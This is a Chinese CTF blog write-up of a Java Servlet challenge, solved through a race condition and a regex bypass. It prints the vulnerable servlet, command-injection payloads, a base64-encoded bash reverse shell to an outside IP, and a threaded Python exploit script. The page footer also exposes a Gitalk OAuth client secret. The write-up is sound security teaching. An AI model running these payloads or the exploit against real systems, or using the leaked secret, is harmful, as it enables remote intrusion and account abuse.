@@ -1,0 +1,335 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>某比赛的某题 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="某比赛的某题 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="今天准备继续学fastjson的，朋友丢过来一道题，看了一下是java的Servlet
+给了附件:
+package com.le1a.web.servlet;
+
+import javax.servlet.ServletException;
+..." />
+    <meta name="keywords" content="Java,Servlet,条件竞争" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              某比赛的某题
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-08
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/JVBP4cyEBuf/" class="post-tag">
+                  # Servlet
+                </a>
+              
+                <a href="https://le1a.github.io/tag/XO2Nzt-G0uG/" class="post-tag">
+                  # 条件竞争
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>今天准备继续学fastjson的，朋友丢过来一道题，看了一下是java的Servlet</p>
+<p>给了附件:</p>
+<pre><code class="language-java">package com.le1a.web.servlet;
+
+import javax.servlet.ServletException;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
+
+@WebServlet(&quot;/test&quot;)
+public class BisaiServlet extends HttpServlet {
+    public int isok;
+
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse response) throws ServletException, IOException {
+        isok=1;
+        String cmd = req.getParameter(&quot;cmd&quot;);
+        if(cmd==null){
+            response.getWriter().write(&quot;please input  get cmd&quot;);
+        }
+        String status = req.getParameter(&quot;status&quot;);
+        if(status.equals(&quot;isok&quot;)){
+            isok=0;
+            try {
+                Thread.sleep(1000);
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        }
+
+        if(isok==0){
+            return;
+        }
+        if(status.equals(&quot;isok&quot;)){
+            try {
+                response.getClass().getMethod(&quot;setStatus&quot;, new Class[]{int.class}).invoke(response, new Object[]{new Integer(200)});
+            } catch (IllegalAccessException e) {
+                e.printStackTrace();
+            } catch (InvocationTargetException e) {
+                e.printStackTrace();
+            } catch (NoSuchMethodException e) {
+                e.printStackTrace();
+            }
+   
+
+            Pattern p = Pattern.compile(&quot;\\$\\(printf .*?\\)&quot;);
+            Matcher m = p.matcher(cmd);
+            boolean b = m.matches();
+            if(b){
+//                response.getWriter().write(cmd);
+                String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd} : new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, cmd};               byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter(&quot;\\A&quot;).next().getBytes();
+
+                response.getOutputStream().write(result);
+                response.getOutputStream().flush();
+                response.getOutputStream().close();
+            }
+
+        }else{
+            response.getWriter().write(&quot;no no no~&quot;);
+        }
+    }
+}
+</code></pre>
+<p>大致看了一下代码，请求两个参数，一个<code>cmd</code>、一个<code>status</code>，首先就是判断<code>status</code>是否为<code>isok</code>，如果是的话就设置<code>isok</code>参数为0，接着走到下一个<code>if</code>语句就直接<code>return</code>了，而命令执行的逻辑是在后面的<code>if</code>语句中，而这两个<code>if</code>语句的判断条件是一致的，也就是不能走到这个<code>if</code>，但要走到下面的<code>if</code>中，这里就又涉及到Servlet的线性安全问题了，以前y4师傅也提到过这个，VNCTF也出现过，这里就不在赘述了，总之就是跑条件竞争就好了。</p>
+<p>继续看后面，有一个正则匹配<code>\\$\\(printf .*?\\)</code>，需要<code>cmd</code>中匹配到正则，然后才能进入下一个<code>if</code>，最后是拼凑出了能用的payload:</p>
+<pre><code class="language-java">$(printf 1) || 命令 || echo \)
+</code></pre>
+<p>本地curl一下看一下命令是否被执行</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220408133415718.png" alt="image-20220408133415718" loading="lazy"></figure>
+<p>发现能成功执行，接下来就改一下命令，直接反弹shell，值得注意的是Java环境反弹shell需要Base64才行，所以payload为:</p>
+<pre><code class="language-url">/test?cmd=$(printf 1) || bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuNjYuNjcvMTIzNDUgMD4mMQ==}|{base64,-d}|{bash,-i}&amp;status=isok
+/test?cmd=$(printf 1) || bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuNjYuNjcvMTIzNDUgMD4mMQ==}|{base64,-d}|{bash,-i}&amp;status=Le1a
+</code></pre>
+<p>因为Payload中含有<code>&amp;</code>，会与传参的&amp;混淆，所以将其url编码一下。</p>
+<h2 id="exp">EXP:</h2>
+<pre><code class="language-python">import requests
+import threading
+
+url1 = &quot;http://82.156.76.166:8083/test?cmd=%24(printf%201)%20%7C%7C%20bash%20-c%20'%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMDEuNDMuNjYuNjcvMTIzNDUgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D'%20%7C%7C%20echo%20%5C)&amp;status=isok&quot;
+url2 = &quot;http://82.156.76.166:8083/test?cmd=%24(printf%201)%20%7C%7C%20bash%20-c%20'%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMDEuNDMuNjYuNjcvMTIzNDUgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D'%20%7C%7C%20echo%20%5C)&amp;status=Le1a&quot;
+
+def one(session):
+    while event.isSet():
+        res = session.get(url=url1).text
+
+def two(session):
+    while event.isSet():
+        res = session.get(url=url2).text
+
+if __name__ == '__main__':
+    event = threading.Event()
+    event.set()
+    session = requests.session()
+    for i in range(1, 30):
+        threading.Thread(target=one, args=(session,)).start()
+    for i in range(1, 30):
+        threading.Thread(target=two, args=(session,)).start()
+</code></pre>
+<p>监听端口，然后运行脚本，收到反弹的Shell，find找一下flag，得到flag:</p>
+<pre><code class="language-flag">flag{i_love_Gcker_very_m0ch}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220408133849351.png" alt="image-20220408133849351" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#exp">EXP:</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
